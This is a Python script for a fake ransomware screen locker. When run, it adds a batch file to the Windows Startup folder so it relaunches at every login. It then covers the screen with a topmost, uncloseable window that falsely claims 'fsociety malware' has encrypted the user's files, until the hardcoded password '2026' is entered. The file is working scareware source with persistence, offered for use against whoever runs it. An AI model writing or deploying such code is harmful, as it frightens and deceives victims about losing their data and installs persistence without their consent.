import os
import tkinter as tk
import sys
from urllib.request import urlopen
from PIL import Image, ImageTk
import time
import socket

root = tk.Tk()
def print_effect(label_widget, full_text, current_index= 0):
    if current_index <= len(full_text):
        current_text = full_text[:current_index]
        label_widget.config(text=current_text)
        root.after(15,print_effect,label_widget,full_text,current_index+1)
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)
def add_autostart():
    file_path = os.path.abspath(sys.argv[0])
    user_profile = os.environ['USERPROFILE']
    startup_path = os.path.join(
        user_profile,
        'AppData','Roaming','Microsoft','Windows','Start Menu', 'Programs', 'Startup'
    )
    bat_path = os.path.join(startup_path, 'leave_me_here.bat')
    with open(bat_path,'w', encoding='utf-8') as bat_file:
        if file_path.endswith('.exe'):
            bat_file.write(f'@echo off\nstart "" "{file_path}"')
        else:
            bat_file.write(f'@echo off\nstart "" "pythonw.exe" "{file_path}"')
add_autostart()
def winlock():
    pass
def pass_check(event=None):
    if password.get() == '2026':
        status_label.configure(text='correct',fg = 'green')
        root.destroy()
    elif password.get() == "Fine bro, i'll be never playing with cheats again":
        status_label.configure(text='Fine bro i hope can trust you\n'
                                    'pass = 2026'
                                    , fg='red')
        root.update()
    else:
        password.delete(0, tk.END)
        status_label.config(text = 'incorrect',fg = 'red')
        root.after(3000,lambda: status_label.config(text = ''))
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f'{screen_width}x{screen_height}+0+0')
bg = 'black'
root.configure(background=bg)
root.overrideredirect(True)
root.attributes('-topmost', True)
root.update()
root.protocol("WM_DELETE_WINDOW", winlock)
center_frame = tk.Frame(root, bg='black')
center_frame.place(relx=0.5, rely=0.5, anchor='center')
top_title = tk.Label(
    center_frame,
    text="",
    font=('Consolas', 16, 'bold'),
    fg='#ff0000',
    bg='black',
    justify='center'
)
warning_text = (
    "your system is locked by fsociety malware\n"
    "your files are crypted now, and you dont have the key\n"
    "Good luck.\n"
    "Fsociety."
)
print_effect(top_title, warning_text)
top_title.pack(pady=(0, 10))
try:
    image_file_path = resource_path('images.png')
    raw_image = Image.open(image_file_path)
    target_width = 700
    img_width, img_height = raw_image.size
    aspect_ration = img_width / img_height
    target_height = int(target_width / aspect_ration)
    resized_image = raw_image.resize((target_width, target_height), Image.Resampling.LANCZOS)
    img_element = ImageTk.PhotoImage(resized_image)
    image_label = tk.Label(center_frame, image=img_element,bg = bg)
    image_label.pack(pady=10)
except Exception as e:
    print(e)
info_label = tk.Label(center_frame, text="<enter terminal password:>", font=('Consolas', 14, 'bold'), fg='#ff0000', bg='black')
info_label.pack(pady=10)
password = tk.Entry(
    center_frame,
    font=('Consolas', 18),
    width=20,
    fg='#ff0000',
    bg='black',
    show='*',
    justify='center',
    insertbackground='#00ff00',
    highlightbackground='#333333',
    highlightcolor='#00ff00',
    highlightthickness=1
)
password.pack(pady=5)
password.focus_set()
password.bind('<Return>', pass_check)
status_label = tk.Label(center_frame, text='', font=('Consolas', 14, 'bold'), bg='black')
status_label.pack(pady=10)
root.mainloop()

